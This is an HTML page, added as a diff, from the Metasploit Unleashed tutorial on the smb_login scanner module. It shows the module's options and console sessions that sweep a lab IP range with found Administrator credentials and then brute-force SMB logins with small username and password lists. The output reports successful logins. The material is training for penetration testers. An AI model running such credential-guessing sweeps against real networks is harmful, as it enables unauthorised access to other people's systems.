@@ -1,0 +1,52 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta content="text/html; charset=ISO-8859-1"
+ http-equiv="Content-Type">
+  <title>auxiliary/scanner/smb/smb_login</title>
+</head>
+<body>
+<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">auxiliary/scanner/smb/smb_login</h1>
+<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
+- Mastering The Framework</h3>
+<p style="color: rgb(0, 0, 0);">Metasploit's smb_login module will
+attempt to login via SMB across a
+provided range of IP addresses. If you have a database plugin loaded,
+successful logins will be stored in it for future reference and usage.
+<br>
+<br>
+</p>
+<pre style="color: rgb(0, 0, 0);">msf &gt; use auxiliary/scanner/smb/smb_login<br>msf auxiliary(smb_login) &gt; show options<br><br>Module options:<br><br>   Name              Current Setting  Required  Description<br>   ----              ---------------  --------  -----------<br>   BLANK_PASSWORDS   true             yes       Try blank passwords for all users<br>   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5<br>   PASS_FILE                          no        File containing passwords, one per line<br>   RHOSTS                             yes       The target address range or CIDR identifier<br>   RPORT             445              yes       Set the SMB service port<br>   SMBDomain         WORKGROUP        no        SMB Domain<br>   SMBPass                            no        SMB Password<br>   SMBUser                            no        SMB Username<br>   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host<br>   THREADS           1                yes       The number of concurrent threads<br>   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line<br>   USER_FILE                          no        File containing usernames, one per line<br>   VERBOSE           true             yes       Whether to print output for all attempts</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">You can clearly see that this module
+has many more options that
+other auxiliary modules and is quite versatile. We will first run a
+scan using the Administrator credentials we 'found'.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">msf auxiliary(smb_login) &gt; set RHOSTS 192.168.1.150-165<br>RHOSTS =&gt; 192.168.1.150-165<br>msf auxiliary(smb_login) &gt; set SMBPass s3cr3t<br>SMBPass =&gt; s3cr3t<br>msf auxiliary(smb_login) &gt; set SMBUser Administrator<br>SMBUser =&gt; Administrator<br>msf auxiliary(smb_login) &gt; set THREADS 16<br>THREADS =&gt; 16<br>msf auxiliary(smb_login) &gt; run<br><br>[*] Starting SMB login attempt on 192.168.1.165<br>[*] Starting SMB login attempt on 192.168.1.153<br>...snip...<br>[*] Starting SMB login attempt on 192.168.1.156<br>[*] 192.168.1.154 - FAILED LOGIN () Administrator :  (STATUS_LOGON_FAILURE)<br>[*] 192.168.1.150 - FAILED LOGIN (Windows 5.1) Administrator :  (STATUS_LOGON_FAILURE)<br>[*] 192.168.1.160 - FAILED LOGIN (Windows 5.1) Administrator :  (STATUS_LOGON_FAILURE)<br>[*] 192.168.1.154 - FAILED LOGIN () Administrator : s3cr3t (STATUS_LOGON_FAILURE)<br>[-] 192.168.1.162 - FAILED LOGIN (Windows 7 Enterprise 7600) Administrator :  (STATUS_ACCOUNT_DISABLED)<br>[*] 192.168.1.161 - FAILED LOGIN (Windows 5.1) Administrator :  (STATUS_LOGON_FAILURE)<br>[+] 192.168.1.150 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'<br>[*] Scanned 04 of 16 hosts (025% complete)<br>[+] 192.168.1.160 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'<br>[+] 192.168.1.161 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'<br>[*] Scanned 13 of 16 hosts (081% complete)<br>[*] Scanned 14 of 16 hosts (087% complete)<br>[*] Scanned 15 of 16 hosts (093% complete)<br>[*] Scanned 16 of 16 hosts (100% complete)<br>[*] Auxiliary module execution completed<br>msf auxiliary(smb_login) &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">The smb_login module can also be
+passed a username and password
+list in order to attempt to brute-force login attempts across a range
+of machines.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">root@bt4:~# cat users.txt<br>Administrator<br>dale<br>chip<br>dookie<br>victim<br>jimmie<br><br>root@bt4:~# cat passwords.txt<br>password<br>god<br>password123<br>s00pers3kr1t<br>s3cr3t</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">We will use this limited set of
+usernames and passwords and run the scan again.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<pre style="color: rgb(0, 0, 0);">msf auxiliary(smb_login) &gt; show options<br><br>Module options:<br><br>   Name              Current Setting  Required  Description<br>   ----              ---------------  --------  -----------<br>   BLANK_PASSWORDS   true             yes       Try blank passwords for all users<br>   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5<br>   PASS_FILE                          no        File containing passwords, one per line<br>   RHOSTS                             yes       The target address range or CIDR identifier<br>   RPORT             445              yes       Set the SMB service port<br>   SMBDomain         WORKGROUP        no        SMB Domain<br>   SMBPass                            no        SMB Password<br>   SMBUser                            no        SMB Username<br>   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host<br>   THREADS           1                yes       The number of concurrent threads<br>   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line<br>   USER_FILE                          no        File containing usernames, one per line<br>   VERBOSE           true             yes       Whether to print output for all attempts<br><br>msf auxiliary(smb_login) &gt; set PASS_FILE /root/passwords.txt<br>PASS_FILE =&gt; /root/passwords.txt<br>msf auxiliary(smb_login) &gt; set USER_FILE /root/users.txt<br>USER_FILE =&gt; /root/users.txt<br>msf auxiliary(smb_login) &gt; set RHOSTS 192.168.1.150-165<br>RHOSTS =&gt; 192.168.1.150-165<br>msf auxiliary(smb_login) &gt; set THREADS 16<br>THREADS =&gt; 16<br>msf auxiliary(smb_login) &gt; set VERBOSE false<br>VERBOSE =&gt; false<br>msf auxiliary(smb_login) &gt; run<br><br>[-] 192.168.1.162 - FAILED LOGIN (Windows 7 Enterprise 7600) Administrator :  (STATUS_ACCOUNT_DISABLED)<br>[*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) dale :<br>[*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) chip :<br>[*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) dookie :<br>[*] 192.168.1.161 - GUEST LOGIN (Windows 5.1) jimmie :<br>[+] 192.168.1.150 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'<br>[+] 192.168.1.160 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'<br>[+] 192.168.1.161 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'<br>[+] 192.168.1.161 - SUCCESSFUL LOGIN (Windows 5.1) 'victim' : 's3cr3t'<br>[+] 192.168.1.162 - SUCCESSFUL LOGIN (Windows 7 Enterprise 7600) 'victim' : 's3cr3t'<br>[*] Scanned 15 of 16 hosts (093% complete)<br>[*] Scanned 16 of 16 hosts (100% complete)<br>[*] Auxiliary module execution completed<br>msf auxiliary(smb_login) &gt;</pre>
+<br style="color: rgb(0, 0, 0);">
+<span style="color: rgb(0, 0, 0);">There are many more options
+available that you should experiment
+with to fully familiarize yourself with this extremely valuable module.
+</span><br style="color: rgb(0, 0, 0);">
+<br style="color: rgb(0, 0, 0);">
+<div style="text-align: center; color: rgb(0, 0, 0);"><a
+ href="http://www.offensive-security.com/metasploit-unleashed/SMB_Scanners"
+ title="SMB Scanners">SMB Scanners</a></div>
+</body>
+</html>
